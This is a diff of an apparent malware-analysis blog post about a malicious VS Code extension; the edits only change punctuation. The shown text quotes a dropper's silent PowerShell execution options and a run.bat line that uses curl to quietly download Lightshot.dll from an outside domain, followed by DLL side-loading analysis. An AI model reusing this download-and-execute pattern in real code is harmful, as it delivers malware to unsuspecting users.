@@ -45,7 +45,7 @@ function activate(context) {
     runScript(context);
 }
 ```
-Here, the activate function is called when the extension is loaded by VS Code, immediately triggering runScript. This confirms that no user interaction is required; the extension simply needs to be present on the system for the code to execute. Now, let’s dive into runScript:
+Here, the activate function is called when the extension is loaded by VS Code, immediately triggering runScript. This confirms that no user interaction is required the extension simply needs to be present on the system for the code to execute. Now, let’s dive into runScript:
 
 ```js
 function runScript(context) {
@@ -74,7 +74,7 @@ function runScript(context) {
     child.unref();
 }
 ```
-First, it creates a control mechanism using a marker file (.done) inside the TEMP directory to prevent multiple executions—a typical behavior in loaders and droppers. The function also resolves the path to an external script that we will analyze later, called scripts/run.bat; this suggests that the main payload code is not contained within this specific file. It is also notable that execution occurs via PowerShell with -WindowStyle Hidden to ensure no terminal is displayed during the payload execution. Other options in the code further reinforce this silent execution, such as detached: true, stdio: 'ignore', and windowsHide: true. Finally, child.unref() is used to remove any link to the parent process.
+First, it creates a control mechanism using a marker file (.done) inside the TEMP directory to prevent multiple executions, a typical behavior in loaders and droppers. The function also resolves the path to an external script that we will analyze later, called scripts/run.bat, this suggests that the main payload code is not contained within this specific file. It is also notable that execution occurs via PowerShell with -WindowStyle Hidden to ensure no terminal is displayed during the payload execution. Other options in the code further reinforce this silent execution, such as detached: true, stdio: 'ignore', and windowsHide: true. Finally, child.unref() is used to remove any link to the parent process.
 
 ## run.bat
 ```bat
@@ -107,7 +107,7 @@ In addition to setting up and creating the directory where the malicious files w
 @curl -s -L -o "%DLL%" "http://syn1112223334445556667778889990.org/Lightshot.dll" >nul 2>&1
 ```
 
-By using curl, it downloads a DLL and an executable from an external domain. The use of -s (silent) and nul redirection eliminates any trace of output leakage, ensuring the download occurs silently and invisibly. This is undoubtedly where the second stage happens; however, when I went to retrieve these binaries, the operation had already concluded. Regardless, I managed to obtain the artifact from the VX-Underground project repository.
+By using curl, it downloads a DLL and an executable from an external domain. The use of -s (silent) and nul redirection eliminates any trace of output leakage, ensuring the download occurs silently and invisibly. This is undoubtedly where the second stage happens, however when I went to retrieve these binaries, the operation had already concluded. Regardless, I managed to obtain the artifact from the VX-Underground project repository.
 
 ## Analyzing the Executable and the DLL
 Something interesting occurs here, the Lightshot.exe binary appeared to be legitimate and signed. Its primary function was actually just to load the malicious DLL, which would then do the "dirty work" of dropping a third execution stage (to which I unfortunately do not have access yet). Let’s analyze and prove what I just described:
@@ -121,7 +121,7 @@ Inside this binary function is where the main initialization responsible for loc
 ```c
 FUN_004073f0((int *)&local_14,&local_18,(uint *)L"\\Lightshot.dll");
 ```
-This is where the construction of the full DLL path happens; it takes the base directory (local_18) and concatenates it with \\Lightshot.dll. As previously mentioned, the binary loads the DLL into memory:
+This is where the construction of the full DLL path happens, it takes the base directory (local_18) and concatenates it with \\Lightshot.dll. As previously mentioned, the binary loads the DLL into memory:
 
 ```c
 LoadLibraryW(local_14);
